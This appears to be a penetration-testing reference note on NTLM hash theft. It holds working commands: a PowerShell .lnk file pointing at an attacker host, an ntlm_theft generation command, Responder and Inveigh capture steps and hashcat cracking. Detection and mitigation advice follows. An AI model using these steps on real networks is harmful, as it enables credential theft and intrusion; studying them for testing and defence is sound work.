---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1557"
  - "#stage/credential-access"
  - "#os/windows"
  - "#protocol/ntlm"
  - "#tool/responder"
  - "#tool/inveigh"
  - "#tool/hashcat"
aliases:
  - NTLM Hash Stealing
  - NetNTLM Theft
  - NTLM Capture
  - Credential Harvesting
---

## Technique
___

NTLM Hash Theft involves capturing NTLM authentication hashes as they're transmitted over the network. When Windows systems attempt to authenticate to resources, they often use the NTLM authentication protocol, which involves sending a hashed version of the user's password. 

An attacker can intercept these hashes through various techniques including file-based attacks, poisoning attacks, and relay attacks. While these hashes cannot be directly used to derive the plaintext password (unlike NTLM stored hashes), they can be used in Pass-the-Hash attacks or can be subjected to offline cracking attempts.

## Theft via Files
___

Attackers can place specially crafted files in locations where users will access them. When Windows Explorer tries to display icons or metadata for these files, it will attempt to connect to a specified server, sending NTLM authentication in the process.

### Manual Creation (.lnk Files)

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("\\DC01.domain.local\OpenShare\IT-Driver.lnk")
$lnk.TargetPath = "\\<AttackerIP>\@ico.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "IT Driver"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Automated Multi-Type Creation with ntlm_theft

[ntlm_theft](https://github.com/Greenwolf/ntlm_theft) can generate multiple file types that trigger NTLM authentication:

```bash
python3 ntlm_theft.py -g all -s <attackerIP> -f '@myfile'
```

This generates various file types including:
- .lnk (Windows shortcut)
- .scf (Shell Command File)
- .url (Internet Shortcut)
- .docx/.xlsx/.pdf (Documents with embedded links)
- .xml (XML with external entity)
- .htm (HTML with embedded resources)

## Capturing Hashes
___

Once the malicious files are in place, you need to capture the authentication attempts:

### Using Responder (Linux)

```bash
sudo responder -I eth0 -wv
```

### Using Inveigh (Windows)

```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version
.\Inveigh.exe
```

To view captured hashes in Inveigh:
```powershell
# Show unique NTLMv2 hashes
GET NTLMV2UNIQUE

# Show usernames from captured hashes
GET NTLMV2USERNAMES
```

## Other NTLM Theft Techniques
___

### Network Poisoning Attacks

These attacks involve responding to broadcast name resolution requests:
- LLMNR Poisoning
- NBT-NS Poisoning
- IPv6 DNS Takeover

### NTLM Relay Attacks

Instead of just capturing hashes, relay attacks forward the authentication to access other systems.

### Other Sources of NTLM Hashes

- MS Exchange Autodiscover
- Windows file shares with automatically mounted icons
- Internet Explorer/Edge when browsing through proxy
- Outlook/Office application connections
- Windows background services (print spooler, WPAD)
- Windows Explorer preview pane
- UNC paths in various applications

## Post-Capture Actions
___

### Cracking the Hashes

[[hash_cracking]]

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Mode 5600 is for NTLMv2 hashes (the most common in modern networks).

### Relaying the Hashes

[[relay_attacks]]

Instead of cracking, captured authentication attempts can be relayed to other services in real-time to gain access.

## Detection & Mitigation
___

### Detection

- Monitor for Responder/Inveigh-like activity on the network
- Look for unusual SMB authentication attempts from unexpected sources
- Monitor for suspicious files with UNC paths placed in network shares
- Watch for multiple failed authentication attempts in quick succession

### Mitigation

- Disable LLMNR and NBT-NS when possible
- Enable SMB signing to prevent NTLM relay attacks
- Use the Protected Users security group for privileged accounts
- Implement strong password policies to resist offline cracking
- Restrict access to network shares
- Use AppLocker or similar technologies to prevent execution of untrusted applications
- Consider implementing Network Level Authentication (NLA)